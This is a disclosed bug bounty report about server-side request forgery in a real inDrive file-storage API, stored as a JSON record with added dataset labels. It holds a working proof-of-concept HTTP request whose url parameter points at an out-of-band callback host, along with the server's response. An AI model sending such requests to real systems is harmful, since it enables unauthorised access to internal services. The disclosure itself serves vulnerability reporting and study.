{
    "reported_to": "inDrive",
    "reported_by": "cypher-28 ",
    "title": "SSRF in https://couriers.indrive.com/api/file-storage",
    "content": "\nSummary:\nSSRF in url parameter in https://couriers.indrive.com/api/file-storage\nSteps To Reproduce:\nI will try to demonstrate it using burp collaborator\nRequest https://couriers.indrive.com/api/file-storage?url=http://va99zfc0lxpm75ogmcjhz8xij9pzdo.oastify.com ( replace url value with your burp collaporator )\nNotice the contnet being displayed in the response and also the Interaction in your burp collaborator\nThe Request\nCode 686 Bytes\n1GET /api/file-storage?url=http://va99zfc0lxpm75ogmcjhz8xij9pzdo.oastify.com HTTP/2\n2Host: couriers.indrive.com\n3Sec-Ch-Ua: \"Google Chrome\";v=\"119\", \"Chromium\";v=\"119\", \"Not?A_Brand\";v=\"24\"\n4Sec-Ch-Ua-Mobile: ?0\n5Sec-Ch-Ua-Platform: \"Linux\"\n6Upgrade-Insecure-Requests: 1\n7User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36\n8Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\n9Sec-Fetch-Site: none\n10Sec-Fetch-Mode: navigate\n11Sec-Fetch-User: ?1\n12Sec-Fetch-Dest: document\n13Accept-Encoding: gzip, deflate\n14Accept-Language: en-US,en;q=0.9,ar;q=0.8\n15\n16\nThe Response\nCode 432 Bytes\n1HTTP/2 200 OK\n2Authorization: Bearer undefined\n3Content-Disposition: attachment; filename=\"file\n4Date: Sun, 31 Dec 2023 13:19:04 GMT\n5X-Envoy-Upstream-Service-Time: 678\n6Server: istio-envoy\n7X-Cache: Miss from cloudfront\n8Via: 1.1 33c6e91bdc193e34e8dcc80edc466018.cloudfront.net (CloudFront)\n9X-Amz-Cf-Pop: MRS52-P2\n10X-Amz-Cf-Id: 9GuBZr1A03ZS0bEYUbDp80JZj8dNYCE4YoVUImLD5RU15dEM-vs5fQ==\n11\n12<html><body>6zy5d1pwzab93qopx8jq2ezjigz</body></html>\nSupporting Material/References:\n\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nNote\nIf you request any website like for example www.google.com, https://couriers.indrive.com/api/file-storage?url=https://www.google.comyou will see its html content being displayed in the response\nImpact\nThe url parameter doesn't sanitize The input properly which can make the Attacker to request any website he wants\n\n",
    "severity": [
        7.0,
        8.9
    ],
    "bounty": null,
    "weaknesses": [
        "Server-Side Request Forgery (SSRF)"
    ],
    "screenshots": {},
    "disclosed_date": 1705443060,
    "report_url": "https://hackerone.com/reports/2300358",
    "is_multi_component": false,
    "complexity": "LOW",
    "novelty": "LOW",
    "vuln_category": "API",
    "steps": [
        [
            1,
            "Send a GET request to https://couriers.indrive.com/api/file-storage with a URL parameter pointing to an external domain (e.g., http://attacker-controlled-domain.com)"
        ],
        [
            2,
            "Observe the response containing the HTML content of the external domain or interaction with the attacker's server"
        ]
    ],
    "vuln_description": "The vulnerability is a Server-Side Request Forgery (SSRF) in the 'url' parameter of the /api/file-storage endpoint. The application fetches and returns content from arbitrary URLs provided in the parameter without proper validation or sanitization, allowing an attacker to interact with internal or external systems.",
    "reason": "The vulnerability is straightforward to discover as it involves a single parameter manipulation with no complex interactions or state manipulation required. The attack follows common SSRF patterns and does not require deep understanding of application logic.",
    "new_complexity": "LOW",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null
}